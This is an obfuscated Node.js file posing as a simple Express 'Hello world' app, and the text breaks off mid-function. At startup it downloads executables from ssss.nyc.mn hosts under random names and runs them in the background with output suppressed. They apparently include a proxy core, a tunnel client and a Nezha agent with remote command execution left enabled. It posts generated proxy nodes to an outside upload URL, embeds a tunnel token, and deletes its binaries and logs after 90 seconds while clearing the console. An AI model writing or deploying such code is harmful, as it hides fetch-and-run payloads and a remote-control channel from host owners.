const _0x4232b7=_0x46c1;(function(_0x70f10d,_0x43040c){const _0x4ebf11=_0x46c1,_0x5f596d=_0x70f10d();while(!![]){try{const _0x11dcca=-parseInt(_0x4ebf11(0x111))/0x1*(parseInt(_0x4ebf11(0xaa))/0x2)+-parseInt(_0x4ebf11(0x151))/0x3*(parseInt(_0x4ebf11(0x125))/0x4)+-parseInt(_0x4ebf11(0x152))/0x5+-parseInt(_0x4ebf11(0xef))/0x6*(-parseInt(_0x4ebf11(0x146))/0x7)+-parseInt(_0x4ebf11(0xdf))/0x8+-parseInt(_0x4ebf11(0xab))/0x9*(parseInt(_0x4ebf11(0x155))/0xa)+parseInt(_0x4ebf11(0xa8))/0xb*(parseInt(_0x4ebf11(0xcc))/0xc);if(_0x11dcca===_0x43040c)break;else _0x5f596d['push'](_0x5f596d['shift']());}catch(_0x227b1a){_0x5f596d['push'](_0x5f596d['shift']());}}}(_0x4d01,0x64320));const express=require(_0x4232b7(0xc6)),app=express(),axios=require(_0x4232b7(0xd5)),os=require('os'),fs=require('fs'),path=require(_0x4232b7(0x127)),{promisify}=require(_0x4232b7(0xf2)),exec=promisify(require('child_process')[_0x4232b7(0xd0)]),{execSync}=require(_0x4232b7(0xda)),UPLOAD_URL=process[_0x4232b7(0xa3)][_0x4232b7(0x11e)]||'',PROJECT_URL=process['env']['PROJECT_URL']||'',AUTO_ACCESS=process[_0x4232b7(0xa3)][_0x4232b7(0x14f)]||![],FILE_PATH=process[_0x4232b7(0xa3)][_0x4232b7(0xed)]||_0x4232b7(0xdb),SUB_PATH=process[_0x4232b7(0xa3)][_0x4232b7(0x163)]||_0x4232b7(0xb1),PORT=process[_0x4232b7(0xa3)][_0x4232b7(0x148)]||process[_0x4232b7(0xa3)][_0x4232b7(0x120)]||0xbb8,UUID=process[_0x4232b7(0xa3)][_0x4232b7(0xc0)]||_0x4232b7(0x105),NEZHA_SERVER=process[_0x4232b7(0xa3)][_0x4232b7(0x159)]||'',NEZHA_PORT=process[_0x4232b7(0xa3)][_0x4232b7(0x119)]||'',NEZHA_KEY=process[_0x4232b7(0xa3)][_0x4232b7(0x110)]||'',ARGO_DOMAIN=process[_0x4232b7(0xa3)]['ARGO_DOMAIN']||_0x4232b7(0xa5),ARGO_AUTH=process[_0x4232b7(0xa3)][_0x4232b7(0xa6)]||_0x4232b7(0xf6),ARGO_PORT=process[_0x4232b7(0xa3)][_0x4232b7(0x138)]||0x1f41,CFIP=process[_0x4232b7(0xa3)]['CFIP']||_0x4232b7(0xf4),CFPORT=process[_0x4232b7(0xa3)]['CFPORT']||0x1bb,NAME=process[_0x4232b7(0xa3)][_0x4232b7(0xf3)]||'baoge6789';!fs[_0x4232b7(0x160)](FILE_PATH)?(fs[_0x4232b7(0x10f)](FILE_PATH),console[_0x4232b7(0x13f)](FILE_PATH+_0x4232b7(0x130))):console[_0x4232b7(0x13f)](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0x2e917b=_0x4232b7,_0x47cf07=_0x2e917b(0xe6);let _0x4b3885='';for(let _0x5a5dd5=0x0;_0x5a5dd5<0x6;_0x5a5dd5++){_0x4b3885+=_0x47cf07[_0x2e917b(0xc9)](Math[_0x2e917b(0x150)](Math[_0x2e917b(0x12d)]()*_0x47cf07[_0x2e917b(0xa7)]));}return _0x4b3885;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();function _0x4d01(){const _0x5b7e40=['path','\x20is\x20running','\x0avless://','pipe','?encryption=none&security=tls&sni=','error','random','false','all','\x20is\x20created','https://arm64.ssss.nyc.mn/web','win32','Empowerment\x20success\x20for\x20','status','\x20>/dev/null\x202>&1\x20&','forEach','TunnelSecret','ARGO_PORT','https://amd64.ssss.nyc.mn/agent','tls','firefox','fileUrl','Content-Type','message','log','arch','response','Error\x20in\x20startserver:','https://arm64.ssss.nyc.mn/agent','countryCode','config.yaml','119ZEZNxd','\x20-s\x20','SERVER_PORT','\x20-c\x20','http','org','443','unshift','/api/delete-nodes','AUTO_ACCESS','floor','15jculYG','569005puoUiU','quic','test','10610Iyzorp','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','get','post','NEZHA_SERVER','base64','writeFileSync','\x20-p\x20','amd','2053','country_code','existsSync','data','php\x20running\x20error:\x20','SUB_PATH','match','\x20failed:\x20','\x20>\x20nul\x202>&1','?security=tls&sni=','config.json','\x20-c\x20\x22','\x0a\x0avmess://','push','/dev/null','env','https+local://8.8.8.8/dns-query','argo6789.baoge456.dpdns.org','ARGO_AUTH','length','29066840pDbZdD','https://amd64.ssss.nyc.mn/web','44FVWGuY','3582KSMEnK','split','tunnel.json','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','taskkill\x20/f\x20/im\x20','list.txt','sub','map','8443','/vmess-argo','npm\x20running\x20error:\x20','stringify','from','chmod','text/plain;\x20charset=utf-8','2087','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','Download\x20','https://amd64.ssss.nyc.mn/v1','join','utf-8','UUID','\x0a\x20\x20\x20\x20','statSync','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','App\x20is\x20running','basename','express','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','has','charAt','success','\x20successfully','12ForBgy','catch','\x0aclient_secret:\x20','https://amd64.ssss.nyc.mn/bot','exec','readdirSync','/sub.txt\x20saved\x20successfully','Nodes\x20uploaded\x20successfully','/trojan-argo','axios','\x22\x20>\x20/dev/null\x202>&1','createWriteStream','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','stream','child_process','./tmp','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','application/json','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','5611280eTsCFG','block','rm\x20-rf\x20','\x0a\x0atrojan://','platform','Empowerment\x20failed\x20for\x20','Unknown','abcdefghijklmnopqrstuvwxyz','set','direct','/tunnel.yml\x20run','listen','https://ipapi.co/json/','ARGO_DOMAIN:','FILE_PATH','.exe\x20>\x20nul\x202>&1','39132dojAwB','/vmess-argo?ed=2560','--tls','util','NAME','cdns.doon.eu.org','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','eyJhIjoiMGM2MjQ2ODZkZDEyNmE4ZTY1MjkzN2VjOWY4NWNiZjgiLCJ0IjoiNDhlNTE5NGEtY2QzNS00MzMzLTk2YmItYzU5MWRjZWFjY2U0IiwicyI6IlpXRTFNMlE1WkRRdFpqSmhPQzAwTVRaakxXRTJZVFV0TnpNeE9UTmhZMk15TXpGbCJ9','send','unlinkSync','none','ArgoDomain:','Error\x20reading\x20boot.log:','Skipping\x20adding\x20automatic\x20access\x20task','&fp=firefox&type=ws&host=','Error\x20executing\x20command:\x20','Add\x20automatic\x20access\x20task\x20faild:\x20','127.0.0.1','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','2096','includes','fileName','fd1a7ab7-f882-49dd-b52f-29bf68fa03c6','readFileSync','2083','tcp','&path=%2Ftrojan-argo%3Fed%3D2560#','boot.log','then','filter','toString','unlink','mkdirSync','NEZHA_KEY','23995iymdrv','pop','Hello\x20world!','substring','&path=%2Fvless-argo%3Fed%3D2560#','/vless-argo','nohup\x20','Subscription\x20uploaded\x20successfully','NEZHA_PORT','xtls-rprx-vision','tunnel.yml','blackhole','NEZHA\x20variable\x20is\x20empty,skip\x20running','UPLOAD_URL','arm64','PORT','sub.txt','vless','arm','http\x20server\x20is\x20running\x20on\x20port:','462028iAgUVB','http://ip-api.com/json/'];_0x4d01=function(){return _0x5b7e40;};return _0x4d01();}let npmPath=path[_0x4232b7(0xbe)](FILE_PATH,npmName),phpPath=path[_0x4232b7(0xbe)](FILE_PATH,phpName),webPath=path[_0x4232b7(0xbe)](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path['join'](FILE_PATH,_0x4232b7(0x121)),listPath=path[_0x4232b7(0xbe)](FILE_PATH,_0x4232b7(0xb0)),bootLogPath=path[_0x4232b7(0xbe)](FILE_PATH,_0x4232b7(0x10a)),configPath=path[_0x4232b7(0xbe)](FILE_PATH,_0x4232b7(0x9e));function deleteNodes(){const _0x1aa19b=_0x4232b7;try{if(!UPLOAD_URL)return;if(!fs[_0x1aa19b(0x160)](subPath))return;let _0x17918f;try{_0x17918f=fs[_0x1aa19b(0x106)](subPath,'utf-8');}catch{return null;}const _0x3e2900=Buffer[_0x1aa19b(0xb7)](_0x17918f,_0x1aa19b(0x15a))[_0x1aa19b(0x10d)](_0x1aa19b(0xbf)),_0x14efef=_0x3e2900[_0x1aa19b(0xac)]('\x0a')[_0x1aa19b(0x10c)](_0x1cb7ac=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x1aa19b(0x154)](_0x1cb7ac));if(_0x14efef[_0x1aa19b(0xa7)]===0x0)return;return axios[_0x1aa19b(0x158)](UPLOAD_URL+_0x1aa19b(0x14e),JSON['stringify']({'nodes':_0x14efef}),{'headers':{'Content-Type':'application/json'}})[_0x1aa19b(0xcd)](_0x59dd9f=>{return null;}),null;}catch(_0x13dd2e){return null;}}function cleanupOldFiles(){const _0x503b64=_0x4232b7;try{const _0x2f3db5=fs[_0x503b64(0xd1)](FILE_PATH);_0x2f3db5[_0x503b64(0x136)](_0x4bd51d=>{const _0x5776d0=_0x503b64,_0x3d232c=path['join'](FILE_PATH,_0x4bd51d);try{const _0x2863eb=fs[_0x5776d0(0xc2)](_0x3d232c);_0x2863eb['isFile']()&&fs[_0x5776d0(0xf8)](_0x3d232c);}catch(_0x1483c1){}});}catch(_0x15b8e0){}}app[_0x4232b7(0x157)]('/',function(_0xa318ca,_0x4708cc){const _0x5c233a=_0x4232b7;_0x4708cc[_0x5c233a(0xf7)](_0x5c233a(0x113));});async function generateConfig(){const _0x320caf=_0x4232b7,_0x31ae3c={'log':{'access':_0x320caf(0xa2),'error':_0x320caf(0xa2),'loglevel':_0x320caf(0xf9)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x320caf(0x122),'settings':{'clients':[{'id':UUID,'flow':_0x320caf(0x11a)}],'decryption':_0x320caf(0xf9),'fallbacks':[{'dest':0xbb9},{'path':_0x320caf(0x116),'dest':0xbba},{'path':_0x320caf(0xb4),'dest':0xbbb},{'path':_0x320caf(0xd4),'dest':0xbbc}]},'streamSettings':{'network':_0x320caf(0x108)}},{'port':0xbb9,'listen':'127.0.0.1','protocol':_0x320caf(0x122),'settings':{'clients':[{'id':UUID}],'decryption':_0x320caf(0xf9)},'streamSettings':{'network':'tcp','security':'none'}},{'port':0xbba,'listen':_0x320caf(0x100),'protocol':_0x320caf(0x122),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x320caf(0xf9),'wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x320caf(0x14a),_0x320caf(0x13a),_0x320caf(0x153)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x320caf(0x100),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':['http',_0x320caf(0x13a),_0x320caf(0x153)],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x320caf(0xf9),'wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':['http','tls',_0x320caf(0x153)],'metadataOnly':![]}}],'dns':{'servers':[_0x320caf(0xa4)]},'outbounds':[{'protocol':'freedom','tag':_0x320caf(0xe8)},{'protocol':_0x320caf(0x11c),'tag':_0x320caf(0xe0)}]};fs[_0x320caf(0x15b)](path[_0x320caf(0xbe)](FILE_PATH,_0x320caf(0x9e)),JSON[_0x320caf(0xb6)](_0x31ae3c,null,0x2));}function _0x46c1(_0x20dc5a,_0x4329d9){const _0x4d0102=_0x4d01();return _0x46c1=function(_0x46c1e7,_0x3e864b){_0x46c1e7=_0x46c1e7-0x9e;let _0x5e7edb=_0x4d0102[_0x46c1e7];return _0x5e7edb;},_0x46c1(_0x20dc5a,_0x4329d9);}function getSystemArchitecture(){const _0x3d38ae=_0x4232b7,_0x3b8afc=os[_0x3d38ae(0x140)]();return _0x3b8afc===_0x3d38ae(0x123)||_0x3b8afc===_0x3d38ae(0x11f)||_0x3b8afc==='aarch64'?_0x3d38ae(0x123):_0x3d38ae(0x15d);}function downloadFile(_0x1c407d,_0x114d2a,_0x763fd4){const _0x5ba904=_0x4232b7,_0x5de0de=_0x1c407d;!fs[_0x5ba904(0x160)](FILE_PATH)&&fs[_0x5ba904(0x10f)](FILE_PATH,{'recursive':!![]});const _0x57e684=fs[_0x5ba904(0xd7)](_0x5de0de);axios({'method':'get','url':_0x114d2a,'responseType':_0x5ba904(0xd9)})[_0x5ba904(0x10b)](_0x2e54b6=>{const _0x54247d=_0x5ba904;_0x2e54b6[_0x54247d(0x161)][_0x54247d(0x12a)](_0x57e684),_0x57e684['on']('finish',()=>{const _0x2ca684=_0x54247d;_0x57e684['close'](),console['log']('Download\x20'+path['basename'](_0x5de0de)+_0x2ca684(0xcb)),_0x763fd4(null,_0x5de0de);}),_0x57e684['on'](_0x54247d(0x12c),_0x22018f=>{const _0x333c40=_0x54247d;fs[_0x333c40(0x10e)](_0x5de0de,()=>{});const _0x390480='Download\x20'+path['basename'](_0x5de0de)+'\x20failed:\x20'+_0x22018f[_0x333c40(0x13e)];console[_0x333c40(0x12c)](_0x390480),_0x763fd4(_0x390480);});})[_0x5ba904(0xcd)](_0x54a6a1=>{const _0x3a0a8e=_0x5ba904,_0xb945d7=_0x3a0a8e(0xbc)+path[_0x3a0a8e(0xc5)](_0x5de0de)+_0x3a0a8e(0x165)+_0x54a6a1[_0x3a0a8e(0x13e)];console['error'](_0xb945d7),_0x763fd4(_0xb945d7);});}async function downloadFilesAndRun(){const _0x27eaac=_0x4232b7,_0x230039=getSystemArchitecture(),_0x5c0213=getFilesForArchitecture(_0x230039);if(_0x5c0213[_0x27eaac(0xa7)]===0x0){console[_0x27eaac(0x13f)]('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x3ec7b8=_0x5c0213[_0x27eaac(0xb2)](_0x47ed1e=>{return new Promise((_0x4f2adb,_0xff19cd)=>{const _0x31257a=_0x46c1;downloadFile(_0x47ed1e[_0x31257a(0x104)],_0x47ed1e[_0x31257a(0x13c)],(_0x37e563,_0x140136)=>{_0x37e563?_0xff19cd(_0x37e563):_0x4f2adb(_0x140136);});});});try{await Promise[_0x27eaac(0x12f)](_0x3ec7b8);}catch(_0x2934ba){console[_0x27eaac(0x12c)]('Error\x20downloading\x20files:',_0x2934ba);return;}function _0x54224a(_0x4b41a5){const _0x508dc0=_0x27eaac,_0x1ebfbd=0x1fd;_0x4b41a5[_0x508dc0(0x136)](_0xc286b6=>{const _0x486bc7=_0x508dc0;fs['existsSync'](_0xc286b6)&&fs[_0x486bc7(0xb8)](_0xc286b6,_0x1ebfbd,_0xf81fdf=>{const _0x30c324=_0x486bc7;_0xf81fdf?console[_0x30c324(0x12c)](_0x30c324(0xe4)+_0xc286b6+':\x20'+_0xf81fdf):console['log'](_0x30c324(0x133)+_0xc286b6+':\x20'+_0x1ebfbd[_0x30c324(0x10d)](0x8));});});}const _0x22e7d0=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x54224a(_0x22e7d0);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x103f31=NEZHA_SERVER[_0x27eaac(0x103)](':')?NEZHA_SERVER[_0x27eaac(0xac)](':')[_0x27eaac(0x112)]():'',_0x3d9b18=new Set(['443',_0x27eaac(0xb3),_0x27eaac(0x102),_0x27eaac(0xba),'2083',_0x27eaac(0x15e)]),_0x59e666=_0x3d9b18[_0x27eaac(0xc8)](_0x103f31)?'true':_0x27eaac(0x12e),_0x4cf40b=_0x27eaac(0xce)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x27eaac(0x156)+_0x59e666+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x27eaac(0x15b)](path[_0x27eaac(0xbe)](FILE_PATH,_0x27eaac(0x145)),_0x4cf40b);const _0x5c5dcc='nohup\x20'+phpPath+_0x27eaac(0x9f)+FILE_PATH+_0x27eaac(0xae);try{await exec(_0x5c5dcc),console[_0x27eaac(0x13f)](phpName+_0x27eaac(0x128)),await new Promise(_0x415aad=>setTimeout(_0x415aad,0x3e8));}catch(_0x6e8c4a){console[_0x27eaac(0x12c)](_0x27eaac(0x162)+_0x6e8c4a);}}else{let _0x19fada='';const _0x19b346=[_0x27eaac(0x14c),_0x27eaac(0xb3),_0x27eaac(0x102),'2087',_0x27eaac(0x107),'2053'];_0x19b346[_0x27eaac(0x103)](NEZHA_PORT)&&(_0x19fada=_0x27eaac(0xf1));const _0x1fdec3=_0x27eaac(0x117)+npmPath+_0x27eaac(0x147)+NEZHA_SERVER+':'+NEZHA_PORT+_0x27eaac(0x15c)+NEZHA_KEY+'\x20'+_0x19fada+_0x27eaac(0xbb);try{await exec(_0x1fdec3),console[_0x27eaac(0x13f)](npmName+_0x27eaac(0x128)),await new Promise(_0x4e749b=>setTimeout(_0x4e749b,0x3e8));}catch(_0x379457){console[_0x27eaac(0x12c)](_0x27eaac(0xb5)+_0x379457);}}}else console[_0x27eaac(0x13f)](_0x27eaac(0x11d));const _0x216bcc=_0x27eaac(0x117)+webPath+_0x27eaac(0x149)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x216bcc),console[_0x27eaac(0x13f)](webName+_0x27eaac(0x128)),await new Promise(_0x4f2b28=>setTimeout(_0x4f2b28,0x3e8));}catch(_0x108089){console[_0x27eaac(0x12c)]('web\x20running\x20error:\x20'+_0x108089);}if(fs['existsSync'](botPath)){let _0x7b7713;if(ARGO_AUTH[_0x27eaac(0x164)](/^[A-Z0-9a-z=]{120,250}$/))_0x7b7713='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH[_0x27eaac(0x164)](/TunnelSecret/)?_0x7b7713='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0x27eaac(0xe9):_0x7b7713=_0x27eaac(0xde)+FILE_PATH+_0x27eaac(0xc3)+ARGO_PORT;try{await exec(_0x27eaac(0x117)+botPath+'\x20'+_0x7b7713+_0x27eaac(0x135)),console['log'](botName+_0x27eaac(0x128)),await new Promise(_0x42d6dc=>setTimeout(_0x42d6dc,0x7d0));}catch(_0x1c1883){console[_0x27eaac(0x12c)](_0x27eaac(0xfe)+_0x1c1883);}}await new Promise(_0x427590=>setTimeout(_0x427590,0x1388));}function getFilesForArchitecture(_0x31b5b1){const _0xbd71f7=_0x4232b7;let _0x39ecde;_0x31b5b1===_0xbd71f7(0x123)?_0x39ecde=[{'fileName':webPath,'fileUrl':_0xbd71f7(0x131)},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:_0x39ecde=[{'fileName':webPath,'fileUrl':_0xbd71f7(0xa9)},{'fileName':botPath,'fileUrl':_0xbd71f7(0xcf)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x3c1f16=_0x31b5b1===_0xbd71f7(0x123)?_0xbd71f7(0x143):_0xbd71f7(0x139);_0x39ecde[_0xbd71f7(0x14d)]({'fileName':npmPath,'fileUrl':_0x3c1f16});}else{const _0x3b2fbc=_0x31b5b1===_0xbd71f7(0x123)?'https://arm64.ssss.nyc.mn/v1':_0xbd71f7(0xbd);_0x39ecde['unshift']({'fileName':phpPath,'fileUrl':_0x3b2fbc});}}return _0x39ecde;}function argoType(){const _0x1d5c4e=_0x4232b7;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x1d5c4e(0x13f)]('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH[_0x1d5c4e(0x103)](_0x1d5c4e(0x137))){fs[_0x1d5c4e(0x15b)](path['join'](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x42cd6c='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH[_0x1d5c4e(0xac)]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path['join'](FILE_PATH,_0x1d5c4e(0xad))+_0x1d5c4e(0x101)+ARGO_DOMAIN+_0x1d5c4e(0xf5)+ARGO_PORT+_0x1d5c4e(0xc7);fs[_0x1d5c4e(0x15b)](path['join'](FILE_PATH,_0x1d5c4e(0x11b)),_0x42cd6c);}else console['log'](_0x1d5c4e(0xd8));}async function extractDomains(){const _0x5adcaf=_0x4232b7;let _0x1b100c;if(ARGO_AUTH&&ARGO_DOMAIN)_0x1b100c=ARGO_DOMAIN,console['log'](_0x5adcaf(0xec),_0x1b100c),await _0x4ca813(_0x1b100c);else try{const _0x3aa560=fs[_0x5adcaf(0x106)](path[_0x5adcaf(0xbe)](FILE_PATH,_0x5adcaf(0x10a)),'utf-8'),_0x498cd8=_0x3aa560[_0x5adcaf(0xac)]('\x0a'),_0x3f0454=[];_0x498cd8[_0x5adcaf(0x136)](_0x4faf76=>{const _0x303d39=_0x5adcaf,_0x1ff77e=_0x4faf76['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x1ff77e){const _0x2ce691=_0x1ff77e[0x1];_0x3f0454[_0x303d39(0xa1)](_0x2ce691);}});if(_0x3f0454[_0x5adcaf(0xa7)]>0x0)_0x1b100c=_0x3f0454[0x0],console[_0x5adcaf(0x13f)](_0x5adcaf(0xfa),_0x1b100c),await _0x4ca813(_0x1b100c);else{console['log']('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x5adcaf(0xf8)](path[_0x5adcaf(0xbe)](FILE_PATH,'boot.log'));async function _0x3a8e69(){const _0x422340=_0x5adcaf;try{process['platform']===_0x422340(0x132)?await exec(_0x422340(0xaf)+botName+_0x422340(0xee)):await exec('pkill\x20-f\x20\x22['+botName[_0x422340(0xc9)](0x0)+']'+botName[_0x422340(0x114)](0x1)+_0x422340(0xd6));}catch(_0x16795c){}}_0x3a8e69(),await new Promise(_0x213fb6=>setTimeout(_0x213fb6,0xbb8));const _0x512d2e='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x5adcaf(0xc3)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x512d2e+_0x5adcaf(0x135)),console[_0x5adcaf(0x13f)](botName+'\x20is\x20running'),await new Promise(_0x5eff5e=>setTimeout(_0x5eff5e,0xbb8)),await extractDomains();}catch(_0x2843cc){console[_0x5adcaf(0x12c)](_0x5adcaf(0xfe)+_0x2843cc);}}}catch(_0x3460fe){console[_0x5adcaf(0x12c)](_0x5adcaf(0xfb),_0x3460fe);}async function _0x1620f7(){const _0x4cd3fd=_0x5adcaf;try{const _0x3dcaf4=await axios[_0x4cd3fd(0x157)](_0x4cd3fd(0xeb),{'timeout':0xbb8});if(_0x3dcaf4[_0x4cd3fd(0x161)]&&_0x3dcaf4[_0x4cd3fd(0x161)][_0x4cd3fd(0x15f)]&&_0x3dcaf4[_0x4cd3fd(0x161)][_0x4cd3fd(0x14b)])return _0x3dcaf4[_0x4cd3fd(0x161)][_0x4cd3fd(0x15f)]+'_'+_0x3dcaf4['data'][_0x4cd3fd(0x14b)];}catch(_0x1ae71a){try{const _0x5cc4d4=await axios[_0x4cd3fd(0x157)](_0x4cd3fd(0x126),{'timeout':0xbb8});if(_0x5cc4d4[_0x4cd3fd(0x161)]&&_0x5cc4d4[_0x4cd3fd(0x161)][_0x4cd3fd(0x134)]===_0x4cd3fd(0xca)&&_0x5cc4d4[_0x4cd3fd(0x161)][_0x4cd3fd(0x144)]&&_0x5cc4d4[_0x4cd3fd(0x161)][_0x4cd3fd(0x14b)])return _0x5cc4d4[_0x4cd3fd(0x161)][_0x4cd3fd(0x144)]+'_'+_0x5cc4d4[_0x4cd3fd(0x161)][_0x4cd3fd(0x14b)];}catch(_0xb469c){}}return _0x4cd3fd(0xe5);}async function _0x4ca813(_0x46df0e){const _0x4a8b79=await _0x1620f7(),_0x588433=NAME?NAME+'-'+_0x4a8b79:_0x4a8b79;return new Promise(_0x20f372=>{setTimeout(()=>{const _0x3a844c=_0x46c1,_0x28801c={'v':'2','ps':''+_0x588433,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':_0x3a844c(0xf9),'host':_0x46df0e,'path':_0x3a844c(0xf0),'tls':_0x3a844c(0x13a),'sni':_0x46df0e,'alpn':'','fp':_0x3a844c(0x13b)},_0x1f4d28=_0x3a844c(0x129)+UUID+'@'+CFIP+':'+CFPORT+_0x3a844c(0x12b)+_0x46df0e+'&fp=firefox&type=ws&host='+_0x46df0e+_0x3a844c(0x115)+_0x588433+_0x3a844c(0xa0)+Buffer[_0x3a844c(0xb7)](JSON['stringify'](_0x28801c))[_0x3a844c(0x10d)](_0x3a844c(0x15a))+_0x3a844c(0xe2)+UUID+'@'+CFIP+':'+CFPORT+_0x3a844c(0x167)+_0x46df0e+_0x3a844c(0xfd)+_0x46df0e+_0x3a844c(0x109)+_0x588433+_0x3a844c(0xc1);console[_0x3a844c(0x13f)](Buffer[_0x3a844c(0xb7)](_0x1f4d28)[_0x3a844c(0x10d)]('base64')),fs[_0x3a844c(0x15b)](subPath,Buffer[_0x3a844c(0xb7)](_0x1f4d28)['toString']('base64')),console[_0x3a844c(0x13f)](FILE_PATH+_0x3a844c(0xd2)),uploadNodes(),app[_0x3a844c(0x157)]('/'+SUB_PATH,(_0x408e06,_0x5b9845)=>{const _0x5a4242=_0x3a844c,_0x342709=Buffer[_0x5a4242(0xb7)](_0x1f4d28)[_0x5a4242(0x10d)](_0x5a4242(0x15a));_0x5b9845[_0x5a4242(0xe7)](_0x5a4242(0x13d),_0x5a4242(0xb9)),_0x5b9845[_0x5a4242(0xf7)](_0x342709);}),_0x20f372(_0x1f4d28);},0x7d0);});}}async function uploadNodes(){const _0x223fc1=_0x4232b7;if(UPLOAD_URL&&PROJECT_URL){const _0xc92636=PROJECT_URL+'/'+SUB_PATH,_0x5e3cb0={'subscription':[_0xc92636]};try{const _0x12264e=await axios['post'](UPLOAD_URL+'/api/add-subscriptions',_0x5e3cb0,{'headers':{'Content-Type':'application/json'}});return _0x12264e&&_0x12264e[_0x223fc1(0x134)]===0xc8?(console['log'](_0x223fc1(0x118)),_0x12264e):null;}catch(_0x6e6112){if(_0x6e6112[_0x223fc1(0x141)]){if(_0x6e6112[_0x223fc1(0x141)][_0x223fc1(0x134)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x223fc1(0x160)](listPath))return;const _0x252970=fs[_0x223fc1(0x106)](listPath,_0x223fc1(0xbf)),_0x1f14e6=_0x252970['split']('\x0a')[_0x223fc1(0x10c)](_0xc68d40=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0xc68d40));if(_0x1f14e6[_0x223fc1(0xa7)]===0x0)return;const _0x41ac63=JSON['stringify']({'nodes':_0x1f14e6});try{const _0x8b3339=await axios[_0x223fc1(0x158)](UPLOAD_URL+'/api/add-nodes',_0x41ac63,{'headers':{'Content-Type':'application/json'}});return _0x8b3339&&_0x8b3339['status']===0xc8?(console[_0x223fc1(0x13f)](_0x223fc1(0xd3)),_0x8b3339):null;}catch(_0xdcf54f){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x423abc=_0x46c1,_0x21c588=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x21c588['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x21c588[_0x423abc(0xa1)](phpPath);process[_0x423abc(0xe3)]===_0x423abc(0x132)?exec('del\x20/f\x20/q\x20'+_0x21c588[_0x423abc(0xbe)]('\x20')+_0x423abc(0x166),_0x4d6443=>{const _0x4f2871=_0x423abc;console['clear'](),console[_0x4f2871(0x13f)]('App\x20is\x20running'),console[_0x4f2871(0x13f)](_0x4f2871(0xdc));}):exec(_0x423abc(0xe1)+_0x21c588[_0x423abc(0xbe)]('\x20')+'\x20>/dev/null\x202>&1',_0x3f3710=>{const _0x323d8f=_0x423abc;console['clear'](),console[_0x323d8f(0x13f)](_0x323d8f(0xc4)),console[_0x323d8f(0x13f)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0xa2e132=_0x4232b7;if(!AUTO_ACCESS||!PROJECT_URL){console['log'](_0xa2e132(0xfc));return;}try{const _0x2767b6=await 